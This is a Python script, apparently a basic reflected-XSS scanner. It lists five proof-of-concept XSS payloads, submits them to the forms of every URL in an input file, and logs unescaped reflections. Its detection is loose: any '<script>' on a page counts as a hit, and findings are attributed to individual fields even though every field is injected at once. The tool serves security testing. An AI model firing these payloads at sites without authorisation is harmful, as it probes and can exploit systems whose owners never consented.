import requests
from bs4 import BeautifulSoup
import urllib.parse
import html
import csv
from typing import List, Dict, Tuple
import os

# Common XSS payloads to test
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    '" onmouseover="alert(1)"',
    "'><svg/onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)"
]

# Output log file
OUTPUT_FILE = "vulnerabilities.txt"

def read_urls(file_path: str) -> List[str]:
    """Read target URLs from a .txt or .csv file."""
    urls = []
    try:
        with open(file_path, 'r') as file:
            if file_path.endswith('.csv'):
                reader = csv.reader(file)
                next(reader, None)  # Skip header if present
                urls = [row[0] for row in reader if row]
            else:
                urls = [line.strip() for line in file if line.strip()]
        return urls
    except FileNotFoundError:
        print(f"Error: {file_path} not found.")
        return []
    except Exception as e:
        print(f"Error reading {file_path}: {e}")
        return []

def write_vulnerability(url: str, input_name: str, payload: str, status_code: int, response_snippet: str):
    """Log vulnerabilities to output file."""
    with open(OUTPUT_FILE, 'a') as f:
        f.write(f"URL: {url}\n")
        f.write(f"Input Name: {input_name}\n")
        f.write(f"Payload: {payload}\n")
        f.write(f"Status Code: {status_code}\n")
        f.write(f"Response Snippet: {response_snippet[:100]}\n")
        f.write("-" * 50 + "\n")

def extract_forms(url: str) -> List[Dict]:
    """Extract forms and their input fields from a webpage."""
    try:
        response = requests.get(url, timeout=5)
        if response.status_code != 200:
            print(f"Failed to fetch {url}: Status {response.status_code}")
            return []
        
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = []
        for form in soup.find_all('form'):
            form_data = {
                'action': form.get('action', ''),
                'method': form.get('method', 'get').lower(),
                'inputs': []
            }
            for input_field in form.find_all(['input', 'textarea']):
                input_type = input_field.get('type', 'text').lower()
                input_name = input_field.get('name', '')
                if input_type in ['text', 'search', 'textarea', 'email', 'password']:
                    form_data['inputs'].append({
                        'name': input_name,
                        'type': input_type
                    })
            if form_data['inputs']:
                forms.append(form_data)
        return forms
    except Exception as e:
        print(f"Error parsing {url}: {e}")
        return []

def inject_payload(url: str, form: Dict, payload: str) -> Tuple[bool, int, str]:
    """Inject XSS payload into form fields and check response."""
    action_url = urllib.parse.urljoin(url, form['action'])
    method = form['method']
    data = {inp['name']: payload for inp in form['inputs'] if inp['name']}
    
    try:
        if method == 'post':
            response = requests.post(action_url, data=data, timeout=5)
        else:
            response = requests.get(action_url, params=data, timeout=5)
        
        response_text = response.text
        # Check if payload is reflected unescaped
        if payload in response_text and html.escape(payload) not in response_text:
            return True, response.status_code, response_text[:100]
        # Check if script tag is echoed back
        if '<script>' in response_text.lower():
            return True, response.status_code, response_text[:100]
        return False, response.status_code, response_text[:100]
    except Exception as e:
        print(f"Error injecting payload to {url}: {e}")
        return False, 0, ""

def scan_url(url: str):
    """Scan a single URL for XSS vulnerabilities."""
    print(f"Scanning {url}...")
    forms = extract_forms(url)
    if not forms:
        print(f"No forms found on {url}")
        return
    
    for form in forms:
        for payload in XSS_PAYLOADS:
            for input_field in form['inputs']:
                is_vulnerable, status_code, response_snippet = inject_payload(url, form, payload)
                if is_vulnerable:
                    print(f"Vulnerability found in {url} with payload: {payload}")
                    write_vulnerability(url, input_field['name'], payload, status_code, response_snippet)

def main():
    """Main function to run XSS scanner."""
    input_file = "sample_urls.txt"
    urls = read_urls(input_file)
    if not urls:
        print("No URLs to scan. Exiting.")
        return
    
    # Clear previous output file
    if os.path.exists(OUTPUT_FILE):
        os.remove(OUTPUT_FILE)
    
    for url in urls:
        scan_url(url)
    
    print(f"Scan complete. Results saved to {OUTPUT_FILE}")

if __name__ == "__main__":
    main()